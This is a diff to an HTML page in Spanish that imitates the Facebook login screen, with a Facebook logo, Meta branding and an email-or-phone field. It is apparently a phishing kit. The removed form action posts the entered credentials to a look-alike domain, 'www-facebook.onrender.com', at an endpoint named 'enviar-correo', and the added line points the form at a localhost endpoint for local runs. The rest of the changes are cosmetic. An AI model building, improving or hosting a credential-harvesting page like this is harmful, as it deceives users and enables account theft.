@@ -86,7 +86,7 @@
         .link {
             display: block; /* Para que ocupe su propia línea y margin: auto funcione si se centra */
             margin: 15px 0;
-            color: #1877f2;
+            color: #0c0c0c;
             text-decoration: none; /* Quita el subrayado predeterminado */
             font-size: 14px;
             text-align: center; /* Centra el texto del enlace */
@@ -119,14 +119,18 @@
             color: #999;
             margin-bottom: 20px;
         }
+        .MLogo{
+            width: 55x;
+            height: 10px;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div class="top-bar">Español</div><br><br>
-
-        <form action="https://www-facebook.onrender.com/enviar-correo" method="post">
+        <!--Para correr localmente usar: http://localhost:3000/enviar-correo -->
+        <form action="http://localhost:3000/enviar-correo" method="post">
             <div><img class="logo" src="logo.png" alt="Facebook Logo"></div>
 
             <input type="text" name="nombre" placeholder="Correo electrónico o número de teléfono" autocomplete="email"><br>
@@ -139,7 +143,7 @@
 
             <input class="create-btn" type="submit" value="Crear cuenta nueva">
         </form>
-        <div class="meta-logo">Meta</div>
+        <div class="meta-logo"><img class="MLogo" src="Rdx.png" alt="Meta"></div>
         <div class="footer">Información &nbsp; Ayuda &nbsp; Más</div>
     </div>
 
